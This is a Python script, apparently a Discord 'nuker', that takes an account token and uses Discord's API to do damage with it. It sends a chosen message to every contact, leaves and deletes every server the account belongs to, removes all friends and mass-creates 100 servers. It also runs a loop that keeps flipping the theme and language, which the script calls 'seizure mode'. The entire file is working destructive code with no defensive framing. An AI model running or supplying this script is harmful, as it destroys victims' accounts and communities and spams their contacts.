import os
import sys
import time
import requests
import threading
import random
from itertools import cycle

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def setTitle(title):
    os.system(f"title {title}")

def custom_seizure(usertoken):
    print('Starting seizure mode (Switching on/off Light/Dark mode)')
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        settings = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        try:
            requests.patch("https://discord.com/api/v9/users/@me/settings", 
                            headers={'Authorization': usertoken}, json=settings)
        except Exception as e:
            print(f"Error during seizure mode: {e}")

def nuke(usertoken, server_name, message_content):
    headers = {'Authorization': usertoken}

    # Send messages to all friends
    try:
        channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        print("Sent a message to all available friends")
        for channel in channel_ids:
            try:
                requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages',
                              headers=headers, data={"content": message_content})
                print(f"\tMessaged ID: {channel['id']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")
    except Exception as e:
        print(f"Error sending messages: {e}")

    # Leave all guilds
    try:
        guild_ids = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        print("Left all available guilds")
        for guild in guild_ids:
            try:
                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}', headers=headers)
                print(f"\tLeft guild: {guild['name']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")
    except Exception as e:
        print(f"Error leaving guilds: {e}")

    # Delete all guilds
    try:
        print("Deleted all available guilds")
        for guild in guild_ids:
            try:
                requests.delete(f'https://discord.com/api/v9/guilds/{guild["id"]}', headers=headers)
                print(f"\tDeleted guild: {guild['name']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")
    except Exception as e:
        print(f"Error deleting guilds: {e}")

    # Remove all friends
    try:
        friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        print("Removed all available friends")
        for friend in friend_ids:
            try:
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', headers=headers)
                print(f"\tRemoved friend: {friend['user']['username']}#{friend['user']['discriminator']}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")
    except Exception as e:
        print(f"Error removing friends: {e}")

    # Create new servers
    try:
        print("Created all servers")
        for i in range(100):
            try:
                payload = {'name': server_name, 'region': 'europe'}
                response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
                if response.status_code == 201:
                    print(f"\tCreated {server_name} #{i}")
                else:
                    print(f"\tFailed to create server {server_name} #{i}: {response.text}")
            except Exception as e:
                print(f"\tEncountered an error and ignored it: {e}")
    except Exception as e:
        print(f"Error creating servers: {e}")

    # Update user settings
    try:
        settings = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=settings)
        user_data = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
        username = user_data['username'] + "#" + user_data['discriminator']
        print(f"\nSuccessfully turned {username} into a troll")
    except Exception as e:
        print(f"Error updating user settings: {e}")

    input("\nPress ENTER to exit")

def main():
    clear()
    usertoken = input("Token: ")
    server_name = input("Enter the name of servers to be created: ")
    message_content = input("Message to send to each friend: ")

    if threading.active_count() <= 100:
        t = threading.Thread(target=custom_seizure, args=(usertoken,))
        t.start()

    nuke(usertoken, server_name, message_content)

if __name__ == "__main__":
    main()
